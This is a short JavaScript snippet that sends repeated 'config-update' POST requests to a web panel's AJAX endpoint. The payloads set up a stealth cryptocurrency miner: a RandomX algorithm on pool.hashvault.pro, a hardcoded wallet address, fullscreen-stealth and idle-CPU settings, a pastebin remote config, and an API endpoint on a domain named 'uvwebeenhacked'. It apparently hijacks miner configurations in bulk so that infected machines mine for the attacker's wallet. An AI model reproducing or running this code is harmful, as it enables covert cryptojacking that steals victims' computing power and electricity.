function fetchData() {
    let _type = "POST";
    let _url = "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": 1,
        "data": JSON.stringify({
            "algo": "rx/0",
            "pool": "pool.hashvault.pro",
            "port": 80,
            "wallet": "49W1LP9vBzjQo3d7yWhnVXKqbbWoZYGy64ydUo89No53ZqG8wdxwQww3Fe7gxbPmWpQjhCBycYSsPU7Qo2yhK9AhQpBQVAx",
            "password": "{RANDOM}",
            "nicehash": false,
            "ssltls": false,
            "max-cpu": 35,
            "idle-wait": 5,
            "idle-cpu": 100,
            "stealth-targets": "",
            "kill-targets": "",
            "stealth-fullscreen": true,
            "remote-config": "https://pastebin.com/raw/BBAtycYb",
             "api-endpoint": "https://haulesbaules-uvwebeenhacked.su/endpoint.php"
        })
    };

    unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Success:", response);
        },
        function(error) {
            console.error("Error:", error);
        }
    );
}
function fetchData2() {
    let _type = "POST";
    let _url = "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": 2,
        "data": JSON.stringify({
            "algo": "rx/0",
            "pool": "pool.hashvault.pro",
            "port": 80,
            "wallet": "49W1LP9vBzjQo3d7yWhnVXKqbbWoZYGy64ydUo89No53ZqG8wdxwQww3Fe7gxbPmWpQjhCBycYSsPU7Qo2yhK9AhQpBQVAx",
            "password": "{RANDOM}",
            "nicehash": false,
            "ssltls": false,
            "max-cpu": 35,
            "idle-wait": 5,
            "idle-cpu": 100,
            "stealth-targets": "",
            "kill-targets": "",
            "stealth-fullscreen": true,
            "remote-config": "https://pastebin.com/raw/BBAtycYb",
             "api-endpoint": "https://haulesbaules-uvwebeenhacked.su/endpoint.php"
        })
    };

    unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Success:", response);
        },
        function(error) {
            console.error("Error:", error);
        }
    );
}


function fetchDataN(N) {
    let _type = "POST";
    let _url = "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": N,
        "data": JSON.stringify({
            "algo": "rx/0",
            "pool": "pool.hashvault.pro",
            "port": 80,
            "wallet": "49W1LP9vBzjQo3d7yWhnVXKqbbWoZYGy64ydUo89No53ZqG8wdxwQww3Fe7gxbPmWpQjhCBycYSsPU7Qo2yhK9AhQpBQVAx",
            "password": "{RANDOM}",
            "nicehash": false,
            "ssltls": false,
            "max-cpu": 35,
            "idle-wait": 5,
            "idle-cpu": 100,
            "stealth-targets": "",
            "kill-targets": "",
            "stealth-fullscreen": true,
            "remote-config": "https://pastebin.com/raw/BBAtycYb",
             "api-endpoint": "https://haulesbaules-uvwebeenhacked.su/endpoint.php"
        })
    };

    unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Success:", response);
        },
        function(error) {
            console.error("Error:", error);
        }
    );
}


for (let i = 3; i <= 10; i++) {
    fetchDataN(i);
}
fetchData(),
fetchData2();
